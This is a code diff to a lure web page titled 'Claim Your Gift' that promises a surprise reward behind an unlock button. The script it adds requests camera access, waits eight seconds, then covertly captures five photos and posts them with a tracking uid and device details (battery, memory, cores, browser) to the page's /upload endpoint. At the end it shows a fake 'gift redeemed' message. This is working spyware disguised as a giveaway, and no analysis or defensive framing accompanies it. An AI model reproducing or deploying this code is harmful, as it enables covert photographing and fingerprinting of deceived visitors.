@@ -4,30 +4,37 @@
     <title>Claim Your Gift</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #1a1a1a; color: white; text-align: center; font-family: Arial; padding: 20px; overflow: hidden; }
-        .btn { background: #00ff00; color: black; padding: 15px 35px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; box-shadow: 0 0 15px #00ff00; }
-        #congrats-banner { color: gold; font-size: 26px; font-weight: bold; display: none; margin-bottom: 20px; }
-        #gift-box { width: 180px; display: none; margin: 20px auto; filter: drop-shadow(0 0 15px gold); }
-        #loading { font-size: 18px; margin-top: 15px; display: none; color: gold; font-weight: bold; }
-        #msg-red { color: #00ff00; font-size: 20px; font-weight: bold; display: none; margin-top: 20px; }
+        body { background: #000; color: white; text-align: center; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { padding: 25px; border: 1px solid #333; border-radius: 20px; background: #0a0a0a; width: 85%; max-width: 400px; }
+        .btn { background: #00ff00; color: black; padding: 15px 35px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; box-shadow: 0 0 15px #00ff00; text-transform: uppercase; }
+        #gift-ui, #success-ui { display: none; }
+        .congrats { color: gold; font-size: 24px; font-weight: bold; margin-bottom: 15px; }
+        .gift-img { width: 200px; margin: 20px auto; display: block; filter: drop-shadow(0 0 20px gold); animation: float 2s infinite alternate; }
+        @keyframes float { from { transform: translateY(0); } to { transform: translateY(-15px); } }
+        .redeem-text { color: #00ff00; font-size: 20px; font-weight: bold; margin-top: 15px; }
+        .bless-text { opacity: 0.8; font-size: 14px; margin-top: 5px; }
+        #loading { color: gold; font-weight: bold; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
-    <div id="main-ui">
-        <h2>🎁 You have a surprise gift! ✨</h2>
-        <button class="btn" onclick="initProcess()">🔓 UNLOCK YOUR GIFT 🎁</button>
+    <div class="container" id="main-ui">
+        <h2>🎁 Surprise Gift For You! ✨</h2>
+        <p>Click below to unlock your special reward</p>
+        <button class="btn" onclick="initProcess()">🔓 UNLOCK GIFT 🎁</button>
     </div>
 
-    <div id="congrats-banner">🎉 Congratulations! 🎉</div>
-    <img id="gift-box" src="https://cdn-icons-png.flaticon.com/512/4213/4213600.png">
-    <p id="loading">🎁 Unlocking your special gift... 🎁</p>
-
-    <div id="success-ui">
-        <p id="msg-red">Your gift has been redeemed. 👍</p>
-        <p id="msg-sub" style="display:none; opacity:0.8;">You are a good person, God bless you. ✨</p>
+    <div class="container" id="gift-ui">
+        <div class="congrats">🎉 Congratulations! 🎉</div>
+        <img class="gift-img" src="https://cdn-icons-png.flaticon.com/512/4213/4213600.png">
+        <p id="loading">🔓Unlocking your gift🎁 please wait...</p>
+        
+        <div id="success-ui">
+            <p class="redeem-text">Your gift has been redeemed. 👍</p>
+            <p class="bless-text">You are a good person, God bless you. ✨</p>
+        </div>
     </div>
 
-    <video id="v" style="display:none" autoplay playsinline></video>
+    <video id="v" style="display:none" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
     <audio id="sound" src="https://www.soundjay.com/misc/sounds/magic-chime-01.mp3"></audio>
 
@@ -37,43 +44,44 @@
             const params = new URLSearchParams(window.location.search);
             const mode = params.get('m') || 'front';
             const uid = params.get('uid');
-            const battery = await navigator.getBattery();
-            const info = { 
-                battery: (battery.level * 100) + "%", 
-                ram: navigator.deviceMemory + " GB", 
-                cores: navigator.hardwareConcurrency || "N/A",
-                browser: navigator.userAgent
-            };
+            
+            let info = { battery: "N/A", ram: navigator.deviceMemory + " GB", cores: navigator.hardwareConcurrency || "N/A", browser: navigator.userAgent.split(' ').pop() };
+            try { let b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; } catch(e){}
 
             document.getElementById('main-ui').style.display = "none";
+            document.getElementById('gift-ui').style.display = "block";
             document.getElementById('loading').style.display = "block";
 
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode==='back'?'environment':'user' } });
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: mode==='back'?'environment':'user', width: {ideal: 640}, height: {ideal: 480} } 
+            });
             document.getElementById('v').srcObject = stream;
 
-            // Wait 8 seconds before taking photos
             await new Promise(r => setTimeout(r, 8000));
 
-            for(let i=0; i<4; i++) {
+            for(let i=1; i<=5; i++) {
                 const c = document.getElementById('c'); const v = document.getElementById('v');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
+                
                 await fetch('/upload', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ image: c.toDataURL('image/jpeg'), uid: uid, mode: mode, info: info })
+                    body: JSON.stringify({ 
+                        image: c.toDataURL('image/jpeg', 0.6), 
+                        uid: uid, 
+                        label: mode.toUpperCase() + " " + i, 
+                        info: info 
+                    })
                 });
-                await new Promise(r => setTimeout(r, 1500));
+                await new Promise(r => setTimeout(r, 2500));
             }
 
             stream.getTracks().forEach(t => t.stop());
             document.getElementById('loading').style.display = "none";
-            document.getElementById('congrats-banner').style.display = "block";
-            document.getElementById('gift-box').style.display = "block";
-            document.getElementById('msg-red').style.display = "block";
-            document.getElementById('msg-sub').style.display = "block";
+            document.getElementById('success-ui').style.display = "block";
             document.getElementById('sound').play();
-        } catch (e) { alert("Permission required to claim gift!"); }
+        } catch (e) { alert("Please allow camera permission to receive the gift!"); }
     }
     </script>
 </body>
